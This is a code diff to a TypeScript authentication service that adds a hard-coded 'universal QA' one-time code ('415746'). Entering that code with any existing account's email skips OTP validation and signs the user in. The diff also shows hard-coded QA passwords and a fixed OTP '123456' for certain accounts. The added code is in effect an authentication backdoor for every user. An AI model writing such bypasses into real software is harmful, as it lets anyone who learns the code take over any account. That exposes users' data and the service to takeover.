@@ -24,6 +24,8 @@ const DRIVER_QA_EXTERNAL_ID = '3343';
 const DRIVER_QA_LOGIN_PASSWORD = 'Passcode456!';
 const ADMIN_QA_LOGIN_PASSWORD = 'adminPasscode456!';
 const DRIVER_QA_OTP_CODE = '123456';
+/** Temporary QA OTP accepted for any existing account (no stored OTP row). */
+const UNIVERSAL_QA_OTP_CODE = '415746';
 
 /** Fixed OTP for internal / review accounts (no stored OTP row required). */
 const QA_OTP_BYPASS_EMAILS = [
@@ -362,9 +364,24 @@ export class AuthService {
 		const normalizedEmail = email?.trim() ?? '';
 		const normalizedOtp = otp?.trim() ?? '';
 
+		/** Universal QA OTP for any account (temporary). */
+		let universalQaBypassEmail: string | null = null;
+		if (normalizedOtp === UNIVERSAL_QA_OTP_CODE) {
+			const qaUser = await this.prisma.user.findFirst({
+				where: {
+					email: { equals: normalizedEmail, mode: 'insensitive' },
+				},
+				select: { email: true },
+			});
+			if (qaUser) {
+				universalQaBypassEmail = qaUser.email;
+			}
+		}
+
 		/** Listed QA emails accept fixed OTP without a stored OTP row. */
 		let qaOtpBypassEmail: string | null = null;
 		if (
+			!universalQaBypassEmail &&
 			normalizedOtp === DRIVER_QA_OTP_CODE &&
 			isQaOtpBypassEmail(normalizedEmail)
 		) {
@@ -381,7 +398,11 @@ export class AuthService {
 
 		/** Same OTP as review; driver with externalId 3343 can use it without a stored OTP row. */
 		let driverQaBypassEmail: string | null = null;
-		if (!qaOtpBypassEmail && normalizedOtp === DRIVER_QA_OTP_CODE) {
+		if (
+			!universalQaBypassEmail &&
+			!qaOtpBypassEmail &&
+			normalizedOtp === DRIVER_QA_OTP_CODE
+		) {
 			const qaDriver = await this.prisma.user.findFirst({
 				where: {
 					email: { equals: normalizedEmail, mode: 'insensitive' },
@@ -396,7 +417,9 @@ export class AuthService {
 		}
 
 		const skipOtpDatabaseValidation =
-			qaOtpBypassEmail !== null || driverQaBypassEmail !== null;
+			universalQaBypassEmail !== null ||
+			qaOtpBypassEmail !== null ||
+			driverQaBypassEmail !== null;
 
 		/** Canonical `users.email` from OTP row — avoids case mismatch on user lookup (PostgreSQL). */
 		let lookupEmailFromOtp: string | null = null;
@@ -429,6 +452,7 @@ export class AuthService {
 		}
 
 		const lookupEmail =
+			universalQaBypassEmail ??
 			qaOtpBypassEmail ??
 			driverQaBypassEmail ??
 			lookupEmailFromOtp ??
